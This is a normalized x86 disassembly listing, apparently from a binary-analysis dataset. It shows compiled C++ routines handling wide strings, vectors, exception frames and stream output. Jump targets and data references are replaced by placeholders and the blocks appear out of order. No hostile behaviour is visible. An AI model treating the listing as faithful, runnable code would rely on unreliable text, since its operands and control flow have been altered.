mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
lea esi [ ebp - 0x48 ]
call sub_4218d0
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edx [ ebp - 0x4c ]
push edx
call sub_438111
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
push 0x0
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
sub_412a50
push ebp
mov ebp esp
push 0xffffffff
push sub_453910
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
call sub_41b850
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
push 0x0
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
call sub_40ab40
test al al
je r-xdata
push 0x0
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
push 0x0
lea edx [ ebp - 0x48 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor edi edi
test cl 0x6
jne r-xdata
xor eax eax
xor esi esi
mov [ ebp - 0x2c ] ax
push esi
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
call sub_401c90
mov [ ebp - 0x4 ] esi
lea edi [ esi + 0x8 ]
lea esp [ esp ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x2
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor edi edi
test cl 0x6
jne r-xdata
push 0xffffffff
mov ecx 0x1
mov edx esi
call sub_406a90
push eax
push rw-data
mov [ ebp - 0x4 ] 0x1
call sub_40a0a0
add esp 0x8
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x34 ] edi
jb r-xdata
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4218d0
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x18 ] edi
jae r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
lea esi [ ebp - 0x48 ]
call sub_4218d0
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
cmp [ eax ] 0x23
je r-xdata
lea eax [ ebp - 0x2c ]
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
lea esi [ ebp - 0x2c ]
call sub_40aa80
mov [ ebp - 0x49 ] al
test al al
lea eax [ ebp - 0x48 ]
je r-xdata
jmp r-xdata
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4218d0
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
sub_412d90
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x8 ]
sub esp 0x14
push ebx
mov ebx [ eax + 0x4 ]
push esi
push edi
cmp ebx [ eax + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push 0xc
push eax
call sub_4374b3
mov edx [ eax + 0xc ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov edx [ ecx + 0x4 ]
add esp 0xc
lea ecx [ ebx + 0x1c ]
push ecx
push ecx
push r--data
push ecx
mov eax 0x20
push ebx
push rw-data
mov [ edx + rw-data ] ax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp + 0x8 ]
add ebx 0x48
cmp ebx [ edx + 0x8 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_412e90
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax + 0x38 ]
push esi
push edi
mov [ esp + 0xc ] ebx
cmp ebx [ eax + 0x3c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add ebx 0x4
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax [ esp + 0xc ]
mov edx [ ebp + 0x8 ]
add eax 0x3c
add ebx 0x3c
mov [ esp + 0xc ] eax
cmp eax [ edx + 0x3c ]
jne r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push 0xc
push eax
call sub_4374b3
mov edx [ eax + 0xc ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov edx [ ecx + 0x4 ]
add esp 0xc
push esi
push ecx
push r--data
push ecx
mov eax 0x20
push ebx
push rw-data
mov [ edx + rw-data ] ax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ eax ] 0x3a
je r-xdata
cmp [ ebx + 0x14 ] 0x8
lea esi [ ebx + 0x1c ]
jb r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_412fb0
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
push ecx
push edx
call sub_413420
mov eax [ esi ]
push eax
call sub_43811c
add esp 0xc
sub_412ff0
push ebp
mov ebp esp
push 0xffffffff
push sub_451b12
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov ecx [ edi + 0x4 ]
cmp ebx ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax ebx
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
mov ecx edi
call sub_4131f0
sub ebx eax
mov eax 0x38e38e39
imul ebx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x48
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_4134b0
mov ecx [ edi ]
lea eax [ esi + esi * 8 ]
lea ebx [ ecx + eax * 8 ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx edi
call sub_4131f0
test eax eax
je r-xdata
sub_4130a0
cmp esi ebx
je r-xdata
mov eax esi
retn
mov eax [ esi ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov [ esi ] ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov edx [ ebx ]
mov [ esi ] edx
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov edx [ ebx + 0x8 ]
mov [ esi + 0x8 ] edx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
push edi
mov edi [ esi + 0x4 ]
call sub_402330
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
xor ecx ecx
pop edi
sub_4130f0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov eax [ ecx + 0x10 ]
push edi
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi eax
cmp esi edi
ja r-xdata
mov eax 0x1
sub eax esi
add edi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
movzx edx [ ebx ]
mov edi edi
mov [ ebp - 0x4 ] eax
mov ecx edi
test edi edi
je r-xdata
test eax eax
je r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx ebx
mov ecx eax
test esi esi
je r-xdata
cmp [ eax ] dx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov bx [ ecx ]
cmp bx [ edx ]
jne r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sbb edx edx
and edx 0xfffffffe
inc edx
je r-xdata
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
mov ecx eax
sub ecx [ ebp - 0x4 ]
or edx 0xffffffff
sar ecx 0x1
sub edx ecx
add edi edx
add eax 0x2
jmp r-xdata
sub_4131b0
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ebx
mov ebx [ esi + 0x4 ]
push ecx
call sub_4133c0
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x8
pop ebx
sub_4131f0
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp esi 0x38e38e2
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x4
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_435a79
pop edi
pop esi
retn
mov edx eax
shr edx 0x1
mov edi 0x38e38e3
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_413260
mov eax esi
cmp eax esi
jae r-xdata
sub_413260
push ebp
mov ebp esp
push 0xffffffff
push sub_451de0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0x38e38e3
jbe r-xdata
mov edx [ esi + 0x8 ]
sub edx [ esi ]
mov eax 0x38e38e39
imul edx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ecx
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_413360
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_4136c0
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x38e38e39
imul ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0xc
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax + eax * 8 ]
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 8 ]
lea ecx [ edi + edi * 8 ]
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 8 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
push ecx
push eax
mov eax ebx
call sub_413420
mov edx [ esi ]
push edx
call sub_43811c
add esp 0xc
sub_413360
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x38e38e3
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
lea eax [ ecx + ecx * 8 ]
add eax eax
add eax eax
add eax eax
push eax
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_4133c0
cmp eax ebx
je r-xdata
retn
push esi
push edi
lea esi [ eax + 0x34 ]
xor edi edi
jmp r-xdata
cmp [ esi ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi ] 0x7
mov [ esi - 0x4 ] edi
mov [ esi - 0x14 ] cx
cmp [ esi - 0x1c ] 0x8
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ esi - 0x1c ] 0x7
mov [ esi - 0x20 ] edi
mov [ esi - 0x30 ] ax
add esi 0x3c
lea ecx [ esi - 0x34 ]
cmp ecx ebx
jne r-xdata
mov edx [ esi - 0x30 ]
push edx
call sub_43811c
add esp 0x4
pop edi
pop esi
sub_413420
push ebp
mov ebp esp
push esi
mov esi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
pop esi
pop ebp
retn
push ebx
push edi
add esi 0x3c
xor edi edi
mov [ esi - 0x4 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
cmp [ esi - 0xc ] 0x8
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov ebx [ esi ]
push ecx
call sub_4133c0
mov edx [ esi - 0x4 ]
push edx
call sub_43811c
add esp 0x8
mov ebx 0x7
xor ecx ecx
mov [ esi - 0xc ] ebx
mov [ esi - 0x10 ] edi
mov [ esi - 0x20 ] cx
cmp [ esi - 0x28 ] 0x8
jb r-xdata
mov eax [ esi - 0x20 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ esi - 0x28 ] ebx
mov [ esi - 0x2c ] edi
mov [ esi - 0x3c ] ax
add esi 0x48
lea ecx [ esi - 0x3c ]
cmp ecx [ ebp + 0x8 ]
jne r-xdata
mov edx [ esi - 0x3c ]
push edx
call sub_43811c
add esp 0x4
mov eax [ esi - 0x4 ]
cmp eax edi
je r-xdata
pop edi
pop ebx
sub_4134b0
push ebp
mov ebp esp
push 0xffffffff
push sub_451783
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
push ebx
or eax 0xffffffff
mov edi esi
call sub_401be0
xor eax eax
mov [ ebp - 0x4 ] eax
lea edi [ esi + 0x1c ]
push eax
mov [ edi + 0x10 ] eax
lea edx [ ebx + 0x1c ]
xor ecx ecx
mov [ edi + 0x14 ] 0x7
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
lea eax [ esi + 0x38 ]
lea ecx [ ebx + 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_413540
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_413540
push ebp
mov ebp esp
push 0xffffffff
push sub_451750
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov edi edx
mov eax 0x0
shr edi 0x1f
add edi edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x4444444
jbe r-xdata
mov ecx edi
call sub_413610
mov ecx edi
shl ecx 0x4
sub ecx edi
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x8 ] edx
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
mov ebx [ ebx ]
push eax
push ecx
push ebx
call sub_4137b0
add esp 0x10
mov [ esi + 0x4 ] eax
push r--data
call sub_435a79
sub_413610
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x4444444
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
mov eax ecx
shl eax 0x4
sub eax ecx
add eax eax
add eax eax
push eax
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_413670
cmp [ esi + 0x34 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x34 ] 0x7
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x20 ] cx
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax [ esi + 0x20 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] ax
retn
mov edx [ esi + 0x4 ]
push edx
call sub_43811c
add esp 0x4
sub_4136c0
push ebp
mov ebp esp
push 0xffffffff
push sub_451dc4
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov ebx ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea ebx [ ebx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
add esi 0x48
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0xc ] esi
add ebx 0x48
jmp r-xdata
xor eax eax
push eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
push ebx
or eax 0xffffffff
mov edi esi
call sub_401be0
xor ecx ecx
lea edi [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x2
push ecx
lea edx [ ebx + 0x1c ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
lea eax [ esi + 0x38 ]
lea ecx [ ebx + 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_413540
cmp ebx [ ebp + 0x8 ]
je r-xdata
sub_413779
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_43c3a5
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_411980
add esi 0x48
cmp esi edi
jne r-xdata
sub_4137b0
push ebp
mov ebp esp
push 0xffffffff
push sub_45172c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
add esi 0x3c
add ebx 0x3c
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov eax [ ebx ]
xor ecx ecx
mov [ esi ] eax
lea edi [ esi + 0x4 ]
push ecx
lea edx [ ebx + 0x4 ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
lea edi [ esi + 0x20 ]
xor eax eax
mov [ ebp - 0x4 ] 0x2
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
add ebx 0x20
mov [ edi ] ax
push ebx
or eax 0xffffffff
call sub_401be0
mov ebx [ ebp + 0x8 ]
sub_41386a
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_43c3a5
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_413670
add esi 0x3c
cmp esi edi
jne r-xdata
sub_4138a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4516ec
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx ]
lea edi [ esi + 0x4 ]
mov [ esi ] ecx
mov [ edi + 0x10 ] eax
push eax
lea eax [ ebx + 0x4 ]
xor edx edx
push eax
mov [ edi + 0x14 ] 0x7
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
xor ecx ecx
lea edi [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
push ecx
add ebx 0x20
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push ebx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
sub_413940
push ebp
mov ebp esp
push 0xffffffff
push sub_4538bc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1ec
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x1f4 ] esi
mov [ ebp - 0x1f8 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x1ec ] ax
mov ebx 0x7
push 0xd
mov eax r--data
lea ecx [ ebp - 0x1ec ]
mov [ ebp - 0x1f4 ] 0x1
mov [ ebp - 0x1f0 ] sub_413f70
mov [ ebp - 0x1d8 ] ebx
mov [ ebp - 0x1dc ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x1d0 ] cx
push 0x1e
mov eax r--data
lea ecx [ ebp - 0x1d0 ]
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1c0 ] esi
call sub_401c90
lea eax [ ebp - 0x1f0 ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push 0xa
mov eax r--data
lea ecx [ ebp - 0x174 ]
mov [ ebp - 0x178 ] sub_414490
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x164 ] esi
mov [ ebp - 0x174 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0x158 ] ax
push 0x1a
mov eax r--data
lea ecx [ ebp - 0x158 ]
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x148 ] esi
call sub_401c90
lea eax [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x1b0 ] cx
push 0x10
